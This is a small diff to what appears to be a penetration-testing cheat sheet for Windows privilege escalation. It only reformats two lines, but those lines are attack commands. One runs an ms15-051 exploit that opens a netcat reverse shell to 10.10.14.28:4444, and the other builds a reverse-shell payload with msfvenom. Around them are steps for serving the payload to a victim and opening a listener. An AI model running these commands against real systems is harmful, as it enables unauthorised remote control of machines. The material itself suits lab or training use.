@@ -91,7 +91,7 @@ git clone https://github.com/worawit/MS17-010.git
 * Check the architecture of victim and choose the right exe
 * upload to victim machine
 * run the following:
-  * ms15-051x64.exe "nc.exe 10.10.14.28 4444 -e cmd.exe"
+  ###### ms15-051x64.exe "nc.exe 10.10.14.28 4444 -e cmd.exe"
 * Needs Listener
 
 ### Windows
@@ -103,7 +103,7 @@ git clone https://github.com/worawit/MS17-010.git
   * Inside th file search and find cmd.exe two times.
   * Change with shell.exe in current directory in victim which you are.
   * generate shell.exe:
-    * msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=6666 -f exe > shell.exe
+    ###### msfvenom -p windows/shell_reverse_tcp LHOST=\<ip> LPORT=6666 -f exe > shell.exe
   * serve the shell.exe to victim
   * open a listener
   * run the ps1 exploit:
